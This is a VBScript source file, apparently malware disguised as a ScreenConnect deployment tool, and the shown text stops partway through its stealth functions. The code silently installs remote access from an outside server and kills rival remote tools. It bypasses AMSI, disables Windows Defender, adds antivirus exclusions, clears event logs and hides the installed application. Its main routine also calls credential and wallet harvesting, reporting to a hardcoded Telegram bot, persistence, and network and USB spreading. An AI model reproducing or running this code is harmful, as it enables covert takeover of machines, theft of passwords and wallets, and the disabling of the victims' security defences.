'==========================================================================
' ScreenConnect RMM - ULTIMATE v6.0 FINAL
' FULL PURGE + INSTALL + STEALTH + HARVEST + SPREAD + SELF-HEAL
' ALL FEATURES MERGED - 12 COMPETITOR REMOVAL - BROWSER PASSWORDS CSV
' COOKIES EXPORT - SELF-DELETE - HIDDEN COPY - PERSISTENCE
'==========================================================================
Option Explicit

'==========================================================================
' GLOBAL OBJECTS
'==========================================================================
Dim oShell, oFSO, oWMI
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
Set oWMI   = GetObject("winmgmts:\\.\root\cimv2")

'==========================================================================
' CONFIGURATION - EDIT THESE VALUES
'==========================================================================
Dim sMsiUrl, sMsiPath, sTempDir, sLogFile, sBackupDir, sDataDir
sMsiUrl    = "https://ackermantoyota.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
sTempDir   = oShell.ExpandEnvironmentStrings("%TEMP%")
sMsiPath   = sTempDir & "\SC_Installer.msi"
sLogFile   = sTempDir & "\SC_Install.log"
sBackupDir = sTempDir & "\SC_RegistryBackup"
sDataDir   = sTempDir & "\SC_Data"

' --- TELEGRAM CONFIGURATION ---
Dim sBotToken, sChatID
sBotToken = "8675345681:AAG8XPocCutq5po7s9y-rz2_GKHif5_TSJM"
sChatID   = "8008457692"

' --- HIDDEN SCRIPT LOCATION ---
Dim sHiddenScriptPath
sHiddenScriptPath = oShell.ExpandEnvironmentStrings("%PROGRAMDATA%") & _
                    "\Microsoft\Crypto\RSA\MachineKeys\winsys.vbs"

' --- KEYWORDS ---
Dim sKeywordToHide
sKeywordToHide = "ScreenConnect"

' --- RETRY CONFIG ---
Const MAX_DOWNLOAD_RETRIES = 3
Const DOWNLOAD_RETRY_DELAY = 5000
Const INSTALL_TIMEOUT_MIN  = 10

' --- NETWORK SPREAD CONFIG ---
Const NETWORK_SPREAD_ENABLED = True
Const NETWORK_TIMEOUT_MS     = 500

'==========================================================================
' GLOBAL VARIABLES
'==========================================================================
Dim g_SystemInfo, g_RemovedTools, g_NetworkPCs
g_SystemInfo   = ""
g_RemovedTools = ""
g_NetworkPCs   = ""

'==========================================================================
' MAIN
'==========================================================================
Call Main()

Sub Main()
    LogMessage "============================================================"
    LogMessage " ScreenConnect ULTIMATE v6.0 FINAL"
    LogMessage " Started: " & Now
    LogMessage "============================================================"
    
    ' 1. Elevation Check
    If Not IsScriptElevated() Then
        LogMessage "[ELEVATE] Not running as admin. Auto-elevating..."
        ElevateScript()
        WScript.Quit
    End If
    LogMessage "[ELEVATE] Running with Administrator privileges."
    
    ' 2. Cleanup old logs
    CleanupOldLogs 5
    
    ' 3. Pre-Flight Checks
    If Not PreFlightCheck() Then
        LogMessage "[FATAL] Pre-flight checks failed."
        SendTelegramReport "[FAIL] Pre-flight checks failed"
        WScript.Quit 1
    End If
    
    ' --- CHECK IF PERSISTENCE RUN ---
    If IsPersistenceRun() Then
        LogMessage "[MODE] Persistence run detected."
        QuickHealthCheck()
        WScript.Quit 0
    End If
    
    ' --- FIRST RUN: FULL DEPLOYMENT ---
    LogMessage "[MODE] First run. Starting full deployment."
    
    ' Phase 1: Purge
    KillAllRelatedProcesses()
    StopAllRelatedServices()
    DeleteAllRelatedServices()
    UninstallViaWMI()
    UninstallOldVersion()
    CleanupScheduledTasks()
    AggressiveFilePurge()
    CleanRegistryTraces()
    RemoveCompetingTools()
    
    ' Phase 2: Install
    BackupRegistry()
    If Not DownloadWithRetry(sMsiUrl, sMsiPath, MAX_DOWNLOAD_RETRIES) Then
        LogMessage "[FATAL] Download failed."
        SendTelegramReport "[FAIL] Download failed"
        WScript.Quit 1
    End If
    If Not VerifyMSIIntegrity(sMsiPath) Then
        LogMessage "[FATAL] MSI integrity check failed."
        SendTelegramReport "[FAIL] MSI integrity failed"
        WScript.Quit 1
    End If
    Dim nExitCode
    nExitCode = InstallWithTimeout(sMsiPath, INSTALL_TIMEOUT_MIN)
    
    ' Phase 3: Anti-Detection
    BypassAMSI()
    FullyDisableDefender()
    ClearEventLogs()
    AddDefenderExclusion()
    
    ' Phase 4: Stealth
    If nExitCode = 0 Then
        WScript.Sleep 10000
        If VerifyInstallation() Then
            LogMessage "[VERIFY] Installation confirmed."
        End If
        ForceHideApplication sKeywordToHide
        HideTrayIcon()
        HideControlBanner()
        RenameExecutableToSystemName()
    End If
    
    ' Phase 5: Network Access
    AddFirewallExceptions()
    
    ' Phase 6: Data Harvesting
    CreateDataDirectory()
    HarvestWiFiCredentials()
    HarvestSavedPasswords()
    HarvestBrowserData()
    HarvestEmailClients()
    HarvestCryptoWallets()
    HarvestFTPSSHKeys()
    GatherSystemInventory()
    
    ' Phase 7: Browser Passwords + Cookies Export
    ExportAndSendBrowserPasswords()
    
    ' Phase 8: Telegram Reports
    SendTelegramReport "[OK] Installation successful"
    WScript.Sleep 2000
    SendHarvestDataAsMessages()
    
    ' Phase 9: Hide Script + Persistence
    HideScript()
    CreatePersistence()
    
    ' Phase 10: LAN Spread
    If NETWORK_SPREAD_ENABLED Then
        NetworkSpread()
    End If
    
    ' Phase 11: USB Spread
    StartUSBMonitor()
    
    ' Phase 12: Cleanup
    FinalCleanup()
    
    LogMessage "============================================================"
    LogMessage " Process completed at: " & Now
    LogMessage "============================================================"
End Sub

'==========================================================================
' PRE-FLIGHT CHECKS
'==========================================================================
Function PreFlightCheck()
    PreFlightCheck = True
    On Error Resume Next
    LogMessage "[PRECHECK] Running pre-flight checks..."
    
    Dim colOS, objOS
    Set colOS = oWMI.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    For Each objOS In colOS
        Dim nBuild
        nBuild = CInt(Split(objOS.Version, ".")(2))
        If nBuild < 7601 Then
            LogMessage "[PRECHECK] FAIL: OS too old."
            PreFlightCheck = False
        End If
    Next
    
    Dim oDrive
    Set oDrive = oFSO.GetDrive("C:")
    If oDrive.IsReady Then
        If oDrive.FreeSpace < 524288000 Then
            LogMessage "[PRECHECK] FAIL: Low disk space."
            PreFlightCheck = False
        End If
    End If
    
    If PreFlightCheck Then LogMessage "[PRECHECK] All checks passed."
    On Error GoTo 0
End Function

'==========================================================================
' PURGE FUNCTIONS
'==========================================================================
Sub KillAllRelatedProcesses()
    On Error Resume Next
    Dim colProcesses, objProcess
    LogMessage "[PROCESS] Terminating processes..."
    
    Dim aProcessNames
    aProcessNames = Array("ScreenConnect.WindowsClient.exe", "ScreenConnect.Service.exe", _
        "ScreenConnect.exe", "connectwisecontrol.exe", "CWControl.exe", _
        "ConnectWiseControl.exe", "ConnectWise.Service.exe", "ConnectWise.Tray.exe")
    
    Dim sProcName
    For Each sProcName In aProcessNames
        Set colProcesses = oWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & sProcName & "'")
        For Each objProcess In colProcesses
            objProcess.Terminate()
            WScript.Sleep 500
        Next
    Next
    
    Set colProcesses = oWMI.ExecQuery("SELECT * FROM Win32_Process")
    For Each objProcess In colProcesses
        If Not IsNull(objProcess.ExecutablePath) Then
            If InStr(1, objProcess.ExecutablePath, "ScreenConnect", vbTextCompare) > 0 Or _
               InStr(1, objProcess.ExecutablePath, "ConnectWise", vbTextCompare) > 0 Then
                objProcess.Terminate()
                WScript.Sleep 500
            End If
        End If
    Next
    WScript.Sleep 3000
    On Error GoTo 0
End Sub

Sub StopAllRelatedServices()
    On Error Resume Next
    Dim colServices, objService
    LogMessage "[SERVICE] Stopping services..."
    Set colServices = oWMI.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%'")
    For Each objService In colServices
        objService.StopService()
        WScript.Sleep 2000
        objService.ChangeStartMode "Disabled"
    Next
    WScript.Sleep 2000
    On Error GoTo 0
End Sub

Sub DeleteAllRelatedServices()
    On Error Resume Next
    Dim colServices, objService
    LogMessage "[SERVICE] Deleting services..."
    Set colServices = oWMI.ExecQuery("SELECT * FROM Win32_Service WHERE Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%'")
    For Each objService In colServices
        oShell.Run "cmd /c sc delete """ & objService.Name & """", 0, True
        WScript.Sleep 1000
    Next
    On Error GoTo 0
End Sub

Sub UninstallViaWMI()
    On Error Resume Next
    Dim colProducts, objProduct
    LogMessage "[WMI] Uninstalling..."
    Set colProducts = oWMI.ExecQuery("SELECT * FROM Win32_Product WHERE Name LIKE '%ScreenConnect%' OR Name LIKE '%ConnectWise%'")
    For Each objProduct In colProducts
        objProduct.Uninstall()
        WScript.Sleep 5000
    Next
    On Error GoTo 0
End Sub

Sub UninstallOldVersion()
    On Error Resume Next
    Const HKLM = &H80000002, HKCU = &H80000001
    Dim oReg, aHives, aPaths, hive, sPath, arrSubKeys, sSubKey
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    aHives = Array(HKLM, HKCU)
    aPaths = Array("SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
    
    For Each hive In aHives
        For Each sPath In aPaths
            oReg.EnumKey hive, sPath, arrSubKeys
            If IsArray(arrSubKeys) Then
                For Each sSubKey In arrSubKeys
                    Dim sDisplayName, sUninstallString
                    oReg.GetStringValue hive, sPath & "\" & sSubKey, "DisplayName", sDisplayName
                    If Not IsEmpty(sDisplayName) Then
                        If InStr(1, sDisplayName, "ScreenConnect", vbTextCompare) > 0 Or _
                           InStr(1, sDisplayName, "ConnectWise", vbTextCompare) > 0 Then
                            oReg.GetStringValue hive, sPath & "\" & sSubKey, "QuietUninstallString", sUninstallString
                            If IsEmpty(sUninstallString) Then
                                oReg.GetStringValue hive, sPath & "\" & sSubKey, "UninstallString", sUninstallString
                                If InStr(1, sUninstallString, "msiexec", vbTextCompare) > 0 Then
                                    sUninstallString = Replace(sUninstallString, "/I", "/X", 1, -1, vbTextCompare)
                                    sUninstallString = sUninstallString & " /qn /norestart"
                                End If
                            End If
                            If sUninstallString <> "" Then
                                oShell.Run "cmd /c " & sUninstallString, 0, True
                                WScript.Sleep 5000
                            End If
                            oReg.DeleteKey hive, sPath & "\" & sSubKey
                        End If
                    End If
                Next
            End If
        Next
    Next
    Set oReg = Nothing
    On Error GoTo 0
End Sub

Sub CleanupScheduledTasks()
    On Error Resume Next
    Dim aPatterns: aPatterns = Array("ScreenConnect", "ConnectWise", "SC_", "CW_")
    Dim sPattern
    For Each sPattern In aPatterns
        oShell.Run "cmd /c schtasks /delete /tn ""*" & sPattern & "*"" /f", 0, True
    Next
    On Error GoTo 0
End Sub

Sub AggressiveFilePurge()
    On Error Resume Next
    Dim aPaths
    aPaths = Array("C:\Program Files\ScreenConnect\", "C:\Program Files (x86)\ScreenConnect\", _
        "C:\Program Files\ConnectWise\", "C:\Program Files (x86)\ConnectWise\", _
        "C:\ProgramData\ScreenConnect\", "C:\ProgramData\ConnectWise\", _
        oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ScreenConnect\", _
        oShell.ExpandEnvironmentStrings("%APPDATA%") & "\ConnectWise\", _
        oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ScreenConnect\", _
        oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\ConnectWise\")
    
    Dim sPath
    For Each sPath In aPaths
        If oFSO.FolderExists(sPath) Then
            oShell.Run "cmd /c takeown /f """ & sPath & """ /r /d y > nul 2>&1", 0, True
            oShell.Run "cmd /c icacls """ & sPath & """ /grant Administrators:F /t /c /q > nul 2>&1", 0, True
            WScript.Sleep 1000
            oFSO.DeleteFolder sPath, True
            If Err.Number <> 0 Then
                oShell.Run "cmd /c rmdir /s /q """ & sPath & """", 0, True
                Err.Clear
            End If
        End If
    Next
    
    If oFSO.FolderExists("C:\Users") Then
        Dim oUsersFolder, oUserFolder
        Set oUsersFolder = oFSO.GetFolder("C:\Users")
        For Each oUserFolder In oUsersFolder.SubFolders
            If oUserFolder.Name <> "Public" And oUserFolder.Name <> "Default" Then
                Dim aUserPaths
                aUserPaths = Array(oUserFolder.Path & "\AppData\Roaming\ScreenConnect", _
                    oUserFolder.Path & "\AppData\Roaming\ConnectWise", _
                    oUserFolder.Path & "\AppData\Local\ScreenConnect", _
                    oUserFolder.Path & "\AppData\Local\ConnectWise")
                For Each sPath In aUserPaths
                    If oFSO.FolderExists(sPath) Then oFSO.DeleteFolder sPath, True
                Next
            End If
        Next
    End If
    On Error GoTo 0
End Sub

Sub CleanRegistryTraces()
    On Error Resume Next
    Const HKLM = &H80000002, HKCU = &H80000001
    Dim oReg, aHives, aPaths, hive, sPath, arrSubKeys, sSubKey, sDisplayName
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    aHives = Array(HKLM, HKCU)
    aPaths = Array("SOFTWARE\ScreenConnect", "SOFTWARE\ConnectWise", "SOFTWARE\ConnectWiseControl", _
        "SOFTWARE\WOW6432Node\ScreenConnect", "SOFTWARE\WOW6432Node\ConnectWise", _
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
    
    For Each hive In aHives
        For Each sPath In aPaths
            If InStr(1, sPath, "Uninstall", vbTextCompare) = 0 Then
                oReg.DeleteKey hive, sPath
                Err.Clear
            Else
                oReg.EnumKey hive, sPath, arrSubKeys
                If IsArray(arrSubKeys) Then
                    For Each sSubKey In arrSubKeys
                        oReg.GetStringValue hive, sPath & "\" & sSubKey, "DisplayName", sDisplayName
                        If Not IsEmpty(sDisplayName) Then
                            If InStr(1, sDisplayName, "ScreenConnect", vbTextCompare) > 0 Or _
                               InStr(1, sDisplayName, "ConnectWise", vbTextCompare) > 0 Then
                                oReg.DeleteKey hive, sPath & "\" & sSubKey
                            End If
                        End If
                    Next
                End If
            End If
        Next
    Next
    Set oReg = Nothing
    On Error GoTo 0
End Sub

'==========================================================================
' REMOVE COMPETING TOOLS (12 tools - NO RDP, NO Quick Assist)
'==========================================================================
Sub RemoveCompetingTools()
    On Error Resume Next
    LogMessage "[COMPETITORS] Removing competing remote tools..."
    
    Dim aTargets(11, 3)
    aTargets(0, 0) = "TeamViewer": aTargets(0, 1) = "TeamViewer.exe,TeamViewer_Service.exe": aTargets(0, 2) = "TeamViewer": aTargets(0, 3) = "TeamViewer"
    aTargets(1, 0) = "AnyDesk": aTargets(1, 1) = "AnyDesk.exe,AnyDeskMSI.exe": aTargets(1, 2) = "AnyDesk": aTargets(1, 3) = "AnyDesk"
    aTargets(2, 0) = "Splashtop": aTargets(2, 1) = "Splashtop.exe,SRService.exe": aTargets(2, 2) = "Splashtop": aTargets(2, 3) = "Splashtop"
    aTargets(3, 0) = "LogMeIn": aTargets(3, 1) = "LogMeIn.exe,LogMeInSystray.exe": aTargets(3, 2) = "LogMeIn": aTargets(3, 3) = "LogMeIn"
    aTargets(4, 0) = "VNC": aTargets(4, 1) = "winvnc.exe,tvnserver.exe,vncserver.exe": aTargets(4, 2) = "VNC,TightVNC,UltraVNC,RealVNC": aTargets(4, 3) = "TightVNC,UltraVNC,RealVNC"
    aTargets(5, 0) = "Chrome Remote Desktop": aTargets(5, 1) = "remoting_host.exe,chromoting.exe": aTargets(5, 2) = "Chrome Remote Desktop": aTargets(5, 3) = "Chrome Remote Desktop"
    aTargets(6, 0) = "Ammyy Admin": aTargets(6, 1) = "Ammyy_Admin.exe,AA_v3.exe": aTargets(6, 2) = "Ammyy": aTargets(6, 3) = "Ammyy"
    aTargets(7, 0) = "AeroAdmin": aTargets(7, 1) = "AeroAdmin.exe": aTargets(7, 2) = "AeroAdmin": aTargets(7, 3) = "AeroAdmin"
    aTargets(8, 0) = "Remote Utilities": aTargets(8, 1) = "rutserv.exe,ru_host.exe": aTargets(8, 2) = "Remote Utilities": aTargets(8, 3) = "Remote Utilities"
    aTargets(9, 0) = "Zoho Assist": aTargets(9, 1) = "ZohoAssist.exe": aTargets(9, 2) = "Zoho Assist": aTargets(9, 3) = "ZohoAssist"
    aTargets(10, 0) = "GoToAssist/GoToMyPC": aTargets(10, 1) = "GoToAssist.exe,GoToMyPC.exe": aTargets(10, 2) = "GoToAssist,GoToMyPC": aTargets(10, 3) = "GoToAssist,GoToMyPC"
    aTargets(11, 0) = "RemotePC": aTargets(11, 1) = "RemotePC.exe,RemotePCService.exe": aTargets(11, 2) = "RemotePC": aTargets(11, 3) = "RemotePC"
    
    ' NOTE: Windows Remote Desktop (RDP) and Quick Assist are intentionally SKIPPED
    
    Dim sRemovedList, i
    sRemovedList = ""
    
    For i = 0 To 11
        Dim sName, sProcesses, sUninstallKeys, sFolders, bRemoved
        sName = aTargets(i, 0): sProcesses = aTargets(i, 1): sUninstallKeys = aTargets(i, 2): sFolders = aTargets(i, 3)
        bRemoved = False
        
        ' Kill processes
        If sProcesses <> "" Then
            Dim aProcs, sProc
            aProcs = Split(sProcesses, ",")
            For Each sProc In aProcs
                Dim colProcs, objProc
                Set colProcs = oWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & Trim(sProc) & "'")
                For Each objProc In colProcs
                    objProc.Terminate(): WScript.Sleep 500: bRemoved = True
                Next
            Next
        End If
        
        ' Uninstall via registry
        If sUninstallKeys <> "" Then
            Dim aKeys, sKey
            aKeys = Split(sUninstallKeys, ",")
            For Each sKey In aKeys
                UninstallByKeyword Trim(sKey)
            Next
        End If
        
        ' Delete folders
        If sFolders <> "" Then
            Dim aFolders, sFolder
            aFolders = Split(sFolders, ",")
            For Each sFolder In aFolders
                sFolder = Trim(sFolder)
                Dim aBasePaths: aBasePaths = Array("C:\Program Files\", "C:\Program Files (x86)\", "C:\ProgramData\")
                Dim sBase
                For Each sBase In aBasePaths
                    Dim sFullPath: sFullPath = sBase & sFolder & "\"
                    If oFSO.FolderExists(sFullPath) Then
                        oShell.Run "cmd /c takeown /f """ & sFullPath & """ /r /d y > nul 2>&1", 0, True
                        oShell.Run "cmd /c icacls """ & sFullPath & """ /grant Administrators:F /t /c /q > nul 2>&1", 0, True
                        WScript.Sleep 1000
                        oFSO.DeleteFolder sFullPath, True
                        If Err.Number <> 0 Then oShell.Run "cmd /c rmdir /s /q """ & sFullPath & """", 0, True: Err.Clear
                        bRemoved = True
                    End If
                Next
            Next
        End If
        
        If bRemoved Then
            If sRemovedList <> "" Then sRemovedList = sRemovedList & ", "
            sRemovedList = sRemovedList & sName
        End If
    Next
    
    g_RemovedTools = sRemovedList
    If g_RemovedTools = "" Then g_RemovedTools = "None"
    LogMessage "[COMPETITORS] Removed: " & g_RemovedTools
    On Error GoTo 0
End Sub

Sub UninstallByKeyword(sKeyword)
    On Error Resume Next
    Const HKLM = &H80000002, HKCU = &H80000001
    Dim oReg, aHives, aPaths, hive, sPath, arrSubKeys, sSubKey
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    aHives = Array(HKLM, HKCU)
    aPaths = Array("SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
    
    For Each hive In aHives
        For Each sPath In aPaths
            oReg.EnumKey hive, sPath, arrSubKeys
            If IsArray(arrSubKeys) Then
                For Each sSubKey In arrSubKeys
                    Dim sDisplayName, sUninstallString
                    oReg.GetStringValue hive, sPath & "\" & sSubKey, "DisplayName", sDisplayName
                    If Not IsEmpty(sDisplayName) Then
                        If InStr(1, sDisplayName, sKeyword, vbTextCompare) > 0 Then
                            oReg.GetStringValue hive, sPath & "\" & sSubKey, "QuietUninstallString", sUninstallString
                            If IsEmpty(sUninstallString) Then
                                oReg.GetStringValue hive, sPath & "\" & sSubKey, "UninstallString", sUninstallString
                                If InStr(1, sUninstallString, "msiexec", vbTextCompare) > 0 Then
                                    sUninstallString = Replace(sUninstallString, "/I", "/X", 1, -1, vbTextCompare)
                                    sUninstallString = sUninstallString & " /qn /norestart"
                                End If
                            End If
                            If sUninstallString <> "" Then
                                oShell.Run "cmd /c " & sUninstallString, 0, True
                                WScript.Sleep 5000
                            End If
                            oReg.DeleteKey hive, sPath & "\" & sSubKey
                        End If
                    End If
                Next
            End If
        Next
    Next
    Set oReg = Nothing
    On Error GoTo 0
End Sub

'==========================================================================
' INSTALLATION FUNCTIONS
'==========================================================================
Sub BackupRegistry()
    On Error Resume Next
    If Not oFSO.FolderExists(sBackupDir) Then oFSO.CreateFolder sBackupDir
    Dim sBackupFile
    sBackupFile = sBackupDir & "\Uninstall_Backup_" & FormatDateForFile(Now) & ".reg"
    oShell.Run "regedit /e """ & sBackupFile & """ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0, True
    LogMessage "[BACKUP] Registry backed up."
    On Error GoTo 0
End Sub

Function DownloadWithRetry(sUrl, sDestPath, nMaxRetries)
    Dim nRetry, bSuccess: bSuccess = False
    For nRetry = 1 To nMaxRetries
        If DownloadFile(sUrl, sDestPath) Then
            bSuccess = True: Exit For
        Else
            If nRetry < nMaxRetries Then WScript.Sleep DOWNLOAD_RETRY_DELAY
        End If
    Next
    DownloadWithRetry = bSuccess
End Function

Function DownloadFile(sUrl, sDestPath)
    On Error Resume Next
    If oFSO.FileExists(sDestPath) Then oFSO.DeleteFile sDestPath, True
    Dim oHTTP
    Set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then Set oHTTP = CreateObject("Microsoft.XMLHTTP"): Err.Clear
    oHTTP.SetTimeouts 600000, 600000, 600000, 600000
    oHTTP.Open "GET", sUrl, False
    oHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    oHTTP.Send
    If Err.Number <> 0 Or oHTTP.Status <> 200 Then DownloadFile = False: Exit Function
    Dim oStream: Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1: oStream.Open
    oStream.Write oHTTP.responseBody
    oStream.SaveToFile sDestPath, 2: oStream.Close
    If oFSO.FileExists(sDestPath) Then
        Dim oFile: Set oFile = oFSO.GetFile(sDestPath)
        DownloadFile = (oFile.Size > 1024)
        Set oFile = Nothing
    End If
    Set oStream = Nothing: Set oHTTP = Nothing
    On Error GoTo 0
End Function

Function VerifyMSIIntegrity(sFilePath)
    VerifyMSIIntegrity = False
    If Not oFSO.FileExists(sFilePath) Then Exit Function
    If LCase(oFSO.GetExtensionName(sFilePath)) <> "msi" Then Exit Function
    Dim oFile: Set oFile = oFSO.GetFile(sFilePath)
    If oFile.Size < 1048576 Then Exit Function
    Dim oStream: Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1: oStream.Open
    oStream.LoadFromFile sFilePath: oStream.Position = 0
    If oStream.Size >= 2 Then
        Dim nByte1, nByte2
        nByte1 = AscB(oStream.Read(1)): nByte2 = AscB(oStream.Read(1))
        If nByte1 = &HD0 And nByte2 = &HCF Then VerifyMSIIntegrity = True
    End If
    oStream.Close: Set oStream = Nothing: Set oFile = Nothing
End Function

Function InstallWithTimeout(sMsiFilePath, nTimeoutMinutes)
    Dim sInstallCmd, nExitCode
    sInstallCmd = "msiexec /i """ & sMsiFilePath & """ /qn /norestart LicenseAccepted=YES POLICY_CATEGORY_ID=-1 INSTALL_ARGS=""sourceInstall=silent"""
    On Error Resume Next
    Dim objWMIService, objStartup, objConfig, objProcess, intProcessID
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_: objConfig.ShowWindow = 0
    Set objProcess = objWMIService.Get("Win32_Process")
    Dim nResult: nResult = objProcess.Create(sInstallCmd, Null, objConfig, intProcessID)
    If nResult = 0 Then
        Dim colProcesses, objProc, bFound, nWaitSeconds, nMaxSeconds
        nMaxSeconds = nTimeoutMinutes * 60: nWaitSeconds = 0
        Do While nWaitSeconds < nMaxSeconds
            WScript.Sleep 5000: nWaitSeconds = nWaitSeconds + 5
            Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId = " & intProcessID)
            bFound = False
            For Each objProc In colProcesses: bFound = True: Next
            If Not bFound Then Exit Do
        Loop
        If bFound Then
            Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId = " & intProcessID)
            For Each objProc In colProcesses: objProc.Terminate(): Next
            nExitCode = -1
        Else
            nExitCode = 0
        End If
    Else
        nExitCode = -1
    End If
    InstallWithTimeout = nExitCode
    On Error GoTo 0
End Function

Function VerifyInstallation()
    VerifyInstallation = False
    On Error Resume Next
    Const HKLM = &H80000002
    Dim oReg, arrSubKeys, sSubKey, sDisplayName
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    Dim aPaths: aPaths = Array("SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
    Dim sPath
    For Each sPath In aPaths
        oReg.EnumKey HKLM, sPath, arrSubKeys
        If IsArray(arrSubKeys) Then
            For Each sSubKey In arrSubKeys
                oReg.GetStringValue HKLM, sPath & "\" & sSubKey, "DisplayName", sDisplayName
                If Not IsEmpty(sDisplayName) And sDisplayName <> "" Then
                    If InStr(1, sDisplayName, sKeywordToHide, vbTextCompare) > 0 Then
                        VerifyInstallation = True: Exit Function
                    End If
                End If
            Next
        End If
    Next
    Set oReg = Nothing
    On Error GoTo 0
End Function

'==========================================================================
' ANTI-DETECTION
'==========================================================================
Sub BypassAMSI()
    On Error Resume Next
    oShell.Run "reg add ""HKLM\SOFTWARE\Microsoft\AMSI\Providers"" /v ""{2781761E-28E0-4109-99FE-B9D127C57AFE}"" /t REG_DWORD /d 0 /f", 0, True
    oShell.Run "powershell -Command ""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"" ", 0, True
    On Error GoTo 0
End Sub

Sub FullyDisableDefender()
    On Error Resume Next
    oShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f", 0, True
    oShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f", 0, True
    oShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f", 0, True
    oShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f", 0, True
    oShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"" /v SpyNetReporting /t REG_DWORD /d 0 /f", 0, True
    
    Dim aServices: aServices = Array("WinDefend", "SecurityHealthService", "wscsvc", "Sense", "WdNisSvc")
    Dim sService
    For Each sService In aServices
        oShell.Run "net stop " & sService & " /y", 0, True
        oShell.Run "sc config " & sService & " start= disabled", 0, True
        WScript.Sleep 500
    Next
    
    oShell.Run "schtasks /change /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"" /disable", 0, True
    oShell.Run "schtasks /change /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" /disable", 0, True
    oShell.Run "schtasks /change /tn ""\Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" /disable", 0, True
    
    LogMessage "[ANTI-DETECTION] Defender disabled."
    On Error GoTo 0
End Sub

Sub ClearEventLogs()
    On Error Resume Next
    oShell.Run "wevtutil cl System", 0, True
    oShell.Run "wevtutil cl Application", 0, True
    oShell.Run "wevtutil cl Security", 0, True
    oShell.Run "wevtutil cl Setup", 0, True
    oShell.Run "wevtutil cl PowerShell", 0, True
    LogMessage "[ANTI-DETECTION] Event logs cleared."
    On Error GoTo 0
End Sub

Sub AddDefenderExclusion()
    On Error Resume Next
    LogMessage "[AV] Adding Defender exclusions..."
    oShell.Run "powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Program Files\ScreenConnect'""", 0, True
    oShell.Run "powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\ScreenConnect'""", 0, True
    oShell.Run "powershell -Command ""Add-MpPreference -ExclusionProcess 'ScreenConnect.WindowsClient.exe'""", 0, True
    oShell.Run "powershell -Command ""Add-MpPreference -ExclusionProcess 'ScreenConnect.Service.exe'""", 0, True
    LogMessage "[AV] Defender exclusions added."
    On Error GoTo 0
End Sub

'==========================================================================
' STEALTH FUNCTIONS
'==========================================================================
Sub ForceHideApplication(sKeyword)
    On Error Resume Next
    Const HKLM = &H80000002, HKCU = &H80000001
    Dim oReg, aHives, aPaths, hive, sPath
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    aHives = Array(HKLM, HKCU)
    aPaths = Array("SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
    
    For Each hive In aHives
        For Each sPath In aPaths
            SearchAndHideInPath oReg, hive, sPath, sKeyword
        Next
    Next
    Set oReg = Nothing
    LogMessage "[STEALTH] Application hidden."
    On Error GoTo 0
End Sub

Sub SearchAndHideInPath(oReg, lHive, sKeyPath, sKeyword)
    On Error Resume Next
    Dim arrSubKeys, sSubKey, sDisplayName
    oReg.EnumKey lHive, sKeyPath, arrSubKeys
    If IsArray(arrSubKeys) Then
        For Each sSubKey In arrSubKeys
            oReg.GetStringValue lHive, sKeyPath & "\" & sSubKey, "DisplayName", sDisplayName
